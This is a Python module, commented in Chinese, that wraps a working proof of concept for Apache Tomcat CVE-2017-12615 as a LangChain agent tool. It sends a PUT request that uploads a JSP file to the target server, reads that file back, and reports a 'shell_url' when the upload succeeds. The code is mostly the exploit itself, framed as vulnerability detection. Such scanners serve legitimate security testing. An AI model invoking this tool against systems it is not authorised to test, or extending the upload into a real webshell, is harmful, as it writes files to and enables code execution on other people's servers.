# -*- coding:utf-8 -*-
"""
Tomcat漏洞POC验证工具
使用@tool装饰器封装backend.poc.tomcat模块
"""

from langchain.tools import tool
from typing import Dict, Any
import uuid


@tool
def tomcat_cve_2017_12615(target: str, timeout: int = 10) -> Dict[str, Any]:
    """Tomcat CVE-2017-12615 PUT方法任意文件写入漏洞检测工具
    
    检测目标是否存在Apache Tomcat在Windows系统下的PUT方法任意文件写入漏洞。
    攻击者可以通过发送恶意的PUT请求来上传JSP文件，从而实现远程代码执行。
    
    影响版本:
    - Apache Tomcat 7.0.0 - 7.0.79
    - Apache Tomcat 8.0.0 - 8.0.43
    - Apache Tomcat 8.5.0 - 8.5.23
    - Apache Tomcat 9.0.0.M1 - 9.0.1
    
    检测原理:
    通过发送PUT请求上传一个包含测试内容的JSP文件，然后尝试访问该文件。
    如果能够成功访问并读取到测试内容，则说明存在漏洞。
    
    注意: 此漏洞仅影响Windows系统下的Tomcat。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:8080
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        from urllib.parse import urlparse
        
        uu = uuid.uuid4()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }
        
        body = '<%out.print("test");%>'
        url_parse = urlparse(target)
        
        if not url_parse.scheme:
            target_url = 'http://' + target
        else:
            target_url = target
            
        put_url = f'{target_url}/{uu}.jsp/'
        
        res = requests.put(put_url, data=body, headers=headers, timeout=timeout)
        code = res.status_code
        
        if code == 201:
            access_url = put_url[:-1]
            whoami = requests.get(access_url, timeout=timeout).text
            if "test" in whoami:
                return {
                    "success": True,
                    "data": {
                        "vulnerable": True,
                        "cve_id": "CVE-2017-12615",
                        "vulnerability": "Tomcat PUT Method Arbitrary File Upload RCE",
                        "target": target_url,
                        "shell_url": access_url
                    },
                    "error": None,
                    "metadata": {
                        "tool": "tomcat_cve_2017_12615",
                        "target": target,
                        "cve_id": "CVE-2017-12615",
                        "severity": "critical"
                    }
                }
        
        return {
            "success": True,
            "data": {
                "vulnerable": False,
                "cve_id": "CVE-2017-12615",
                "target": target_url
            },
            "error": None,
            "metadata": {
                "tool": "tomcat_cve_2017_12615",
                "target": target,
                "cve_id": "CVE-2017-12615"
            }
        }
    except ImportError as e:
        return {
            "success": False,
            "data": None,
            "error": f"导入requests模块失败: {str(e)}",
            "metadata": {"tool": "tomcat_cve_2017_12615", "target": target}
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行tomcat_cve_2017_12615工具异常: {str(e)}",
            "metadata": {"tool": "tomcat_cve_2017_12615", "target": target}
        }


if __name__ == "__main__":
    test_result = tomcat_cve_2017_12615.invoke("http://127.0.0.1:8080")
    print(test_result)
